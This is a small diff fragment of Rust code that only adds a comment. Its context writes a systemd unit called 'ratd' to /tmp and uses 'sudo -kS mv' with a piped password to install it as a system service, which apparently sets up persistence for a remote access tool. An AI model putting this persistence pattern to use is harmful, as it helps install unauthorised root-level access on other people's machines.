@@ -61,6 +61,7 @@ WantedBy=multi-user.target\n";
         let mut f = File::create("/tmp/ratd").unwrap();
         let _ = f.write_all(&service.as_bytes());
 
+        // moving service file
         let mut child1 = std::process::Command::new("sudo")
             .args(["-kS", "mv", "/tmp/ratd", "/etc/systemd/system/ratd.service"])
             .stdin(Stdio::piped())
